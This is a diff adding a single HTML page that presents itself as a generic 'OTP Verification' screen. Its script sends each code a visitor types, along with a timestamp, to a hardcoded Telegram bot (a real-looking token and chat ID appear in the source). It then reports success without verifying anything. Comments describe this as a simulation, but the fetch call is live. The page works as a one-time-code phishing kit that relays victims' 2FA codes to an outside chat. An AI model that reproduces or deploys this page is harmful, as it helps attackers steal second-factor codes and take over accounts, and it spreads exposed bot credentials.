@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification System</title>
+    <style>
+        :root {
+            --primary-color: #4361ee;
+            --secondary-color: #3f37c9;
+            --accent-color: #f72585;
+            --light-color: #f8f9fa;
+            --dark-color: #212529;
+            --success-color: #4bb543;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .logo {
+            margin-bottom: 30px;
+        }
+        
+        .logo img {
+            width: 80px;
+            height: 80px;
+        }
+        
+        h1 {
+            color: var(--dark-color);
+            margin-bottom: 10px;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        
+        p {
+            color: #6c757d;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+        
+        .otp-input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            border: 2px solid #e9ecef;
+            border-radius: 8px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        .otp-input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+        }
+        
+        .otp-input.filled {
+            border-color: var(--success-color);
+        }
+        
+        .action-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        button {
+            padding: 12px;
+            border-radius: 8px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .verify-btn {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .verify-btn:hover {
+            background-color: var(--secondary-color);
+        }
+        
+        .resend-btn {
+            background-color: transparent;
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+        }
+        
+        .resend-btn:hover {
+            background-color: rgba(67, 97, 238, 0.1);
+        }
+        
+        .countdown {
+            color: #6c757d;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+        
+        .status-message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        .success {
+            background-color: rgba(75, 181, 67, 0.2);
+            color: var(--success-color);
+            display: block;
+        }
+        
+        .error {
+            background-color: rgba(220, 53, 69, 0.2);
+            color: #dc3545;
+            display: block;
+        }
+        
+        .telegram-webhook {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            background-color: #0088cc;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .telegram-webhook img {
+            width: 16px;
+            height: 16px;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .otp-input {
+                width: 40px;
+                height: 40px;
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://placehold.co/100x100?text=🔐&font=Montserrat" alt="Secure OTP Verification Logo">
+        </div>
+        <h1>OTP Verification</h1>
+        <p>We've sent a verification code to your registered phone number</p>
+        
+        <form id="otpForm">
+            <div class="otp-container">
+                <input type="text" class="otp-input" maxlength="1" data-index="0" autofocus>
+                <input type="text" class="otp-input" maxlength="1" data-index="1">
+                <input type="text" class="otp-input" maxlength="1" data-index="2">
+                <input type="text" class="otp-input" maxlength="1" data-index="3">
+                <input type="text" class="otp-input" maxlength="1" data-index="4">
+                <input type="text" class="otp-input" maxlength="1" data-index="5">
+            </div>
+            
+            <div class="action-buttons">
+                <button type="button" class="verify-btn" id="verifyBtn">Verify</button>
+                <button type="button" class="resend-btn" id="resendBtn" disabled>Resend Code (60s)</button>
+                <span class="countdown" id="countdown"></span>
+            </div>
+            
+            <div class="status-message" id="statusMessage"></div>
+        </form>
+        
+        <div class="telegram-webhook">
+            <img src="https://placehold.co/16x16?text=TG" alt="Telegram Logo">
+            <span>Webhook Active</span>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const resendBtn = document.getElementById('resendBtn');
+            const countdownEl = document.getElementById('countdown');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            let countdown = 60;
+            let countdownInterval;
+            
+            // Telegram bot details (replace with your actual bot token and chat ID)
+            const TELEGRAM_BOT_TOKEN = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+            const TELEGRAM_CHAT_ID = '7549590022';
+            
+            // Start countdown timer
+            startCountdown();
+            
+            // Handle OTP input navigation
+            otpInputs.forEach(input => {
+                input.addEventListener('input', function() {
+                    const value = this.value;
+                    const index = parseInt(this.dataset.index);
+                    
+                    if (value.length === 1) {
+                        this.classList.add('filled');
+                        
+                        if (index < otpInputs.length - 1) {
+                            otpInputs[index + 1].focus();
+                        } else {
+                            verifyBtn.focus();
+                        }
+                    } else {
+                        this.classList.remove('filled');
+                    }
+                    
+                    // Auto verify if all fields are filled
+                    if (checkAllFieldsFilled()) {
+                        verifyOTP();
+                    }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    const index = parseInt(this.dataset.index);
+                    
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+            });
+            
+            // Verify button click handler
+            verifyBtn.addEventListener('click', verifyOTP);
+            
+            // Resend button click handler
+            resendBtn.addEventListener('click', function() {
+                generateAndSendOTP();
+                resetCountdown();
+                showStatusMessage('New OTP code has been sent!', 'success');
+            });
+            
+            function checkAllFieldsFilled() {
+                return Array.from(otpInputs).every(input => input.value.length === 1);
+            }
+            
+            function getOTP() {
+                return Array.from(otpInputs)
+                    .map(input => input.value)
+                    .join('');
+            }
+            
+            function verifyOTP() {
+                const otp = getOTP();
+                
+                if (otp.length !== 6) {
+                    showStatusMessage('Please enter a complete 6-digit OTP code', 'error');
+                    return;
+                }
+                
+                // Simulate verification
+                showStatusMessage('Verifying OTP code...', 'success');
+                
+                // Send OTP to Telegram
+                sendOTPToTelegram(otp);
+                
+                // Normally you would verify with your backend here
+                setTimeout(() => {
+                    showStatusMessage('OTP verified successfully!', 'success');
+                    
+                    // Here you would redirect or proceed with authentication
+                    // window.location.href = '/dashboard';
+                }, 1500);
+            }
+            
+            function generateAndSendOTP() {
+                // Generate random 6-digit OTP
+                const generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+                
+                // Send OTP to Telegram (simulate sending)
+                sendOTPToTelegram(generatedOTP);
+                
+                // In a real app, you would send this to the user's phone
+                console.log('Generated OTP:', generatedOTP);
+                
+                return generatedOTP;
+            }
+            
+            function sendOTPToTelegram(otp) {
+                const message = `🔐 New OTP Verification\n\nOTP Code: ${otp}\n\nTimestamp: ${new Date().toLocaleString()}`;
+                
+                // In a production app, you would use a backend API to send to Telegram
+                // This is a client-side simulation of the Telegram webhook
+                console.log('Sending to Telegram:', message);
+                
+                // Simulated Telegram API call
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+                
+                // Note: In production, this should be done through a backend service
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => console.log('Telegram response:', data))
+                    .catch(error => console.error('Error sending to Telegram:', error));
+            }
+            
+            function startCountdown() {
+                updateCountdownDisplay();
+                countdownInterval = setInterval(() => {
+                    countdown--;
+                    updateCountdownDisplay();
+                    
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        resendBtn.disabled = false;
+                        resendBtn.textContent = 'Resend Code';
+                        countdownEl.textContent = '';
+                    }
+                }, 1000);
+            }
+            
+            function resetCountdown() {
+                clearInterval(countdownInterval);
+                countdown = 60;
+                resendBtn.disabled = true;
+                startCountdown();
+            }
+            
+            function updateCountdownDisplay() {
+                resendBtn.textContent = `Resend Code (${countdown}s)`;
+            }
+            
+            function showStatusMessage(message, type) {
+                statusMessage.textContent = message;
+                statusMessage.className = 'status-message ' + type;
+                
+                setTimeout(() => {
+                    statusMessage.style.opacity = '1';
+                }, 10);
+                
+                setTimeout(() => {
+                    statusMessage.style.opacity = '0';
+                }, 3000);
+            }
+            
+            // Generate initial OTP for demonstration
+            generateAndSendOTP();
+        });
+    </script>
+</body>
+</html>
